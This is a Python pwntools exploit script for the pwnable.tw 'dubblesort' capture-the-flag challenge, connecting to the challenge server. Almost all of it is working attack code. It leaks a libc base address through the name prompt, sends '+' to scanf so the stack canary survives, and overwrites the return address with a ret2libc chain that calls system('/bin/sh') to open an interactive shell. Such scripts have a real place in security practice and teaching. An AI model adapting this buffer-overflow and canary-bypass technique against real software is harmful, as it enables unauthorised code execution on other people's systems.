#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    if local == 0:
        return
    binaryname = 'dubblesort'
    interruptPoint=[0xa48, 0xa95, 0xab3]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

local = 0
# +/- doesn't change target value when scanf
# io = process('./dubblesort', env = {'LD_PRELOAD':'./libc_32.so.6'})
io = remote('chall.pwnable.tw', 10101)
libc = ELF('./libc_32.so.6')
io.recvuntil('name :')
debug()
io.sendline('a' * 0x1b)
io.recvuntil('aaa\n')
libcbase = u32(io.recv(4)) - 0x1ae244
success('libcbase', libcbase)
libc.address = libcbase

io.recvuntil('sort :')
io.sendline('35')
for i in range(24):
    io.sendlineafter('number : ', '0')

io.sendlineafter('number : ', '+') 
# scanf('%d') doesn't change the target value when recv +/-
# so the canary won't be destroyed
for i in range(7):
    io.sendlineafter('number : ', str(0xf7000000))
io.sendlineafter('number : ', str(libc.sym['system']))
io.sendlineafter('number : ', str(libc.sym['system'] + 1))
io.sendlineafter('number : ', str(libc.search('/bin/sh').next()))




io.interactive()




